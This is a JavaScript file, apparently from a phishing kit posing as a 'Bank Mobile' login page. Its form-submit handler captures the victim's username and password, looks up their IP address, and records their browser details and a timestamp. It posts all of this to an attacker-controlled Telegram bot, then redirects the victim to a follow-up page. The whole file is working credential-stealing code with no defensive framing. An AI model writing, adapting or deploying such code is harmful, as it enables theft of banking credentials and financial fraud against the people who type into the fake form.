// your-script.js

async function loadConfig() {
  try {
    const response = await fetch('config.json');
    const config = await response.json();
    return config;
  } catch (error) {
    console.error('Error loading config:', error);
    return null; // Return null if there's an error fetching the config
  }
}

async function handleFormSubmit(event) {
  event.preventDefault();

  const form = event.target;
  const formData = new FormData(form);

  const email = formData.get('username') || 'Unknown'; // Get email or default to 'Unknown'
  const password = formData.get('password') || 'Unknown'; // Get password or default to 'Unknown'

  const ip = await getIPAddress(); // Fetch the user's IP address
  const browser = navigator.userAgent; // Get browser info
  const timestamp = new Date().toISOString().slice(0, 19).replace('T', ' '); // Get current timestamp

  const message = `Bank Mobile 🔐 New Login Attempt\n` +
    `📧 Email: ${email}\n` +
    `🔑 Password: ${password}\n` +
    `📍 IP: ${ip}\n` +
    `🖥 Browser: ${browser}\n` +
    `⏳ Time: ${timestamp}`;

  const config = await loadConfig(); // Load Telegram bot configuration

  if (!config) {
    console.error('Configuration not loaded.');
    return;
  }

  const url = `https://api.telegram.org/bot${config.telegramBotToken}/sendMessage`; // Use bot token from config

  const data = {
    chat_id: config.telegramChatId, // Use chat ID from config
    text: message,
  };

  try {
    await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });

    // Redirect to m.html with email as URL parameter
    window.location.href = `m.html?email=${encodeURIComponent(email)}`;

  } catch (error) {
    console.error('Error sending message:', error);
    // Redirect even on error
    window.location.href = `m.html?email=${encodeURIComponent(email)}`;
  }
}

async function getIPAddress() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error('Error getting IP address:', error);
    return 'Unknown';
  }
}

document.addEventListener('DOMContentLoaded', () => {
  const form = document.querySelector('form');
  if (form) {
    form.addEventListener('submit', handleFormSubmit);
  } else {
    console.error('Form not found');
  }
});
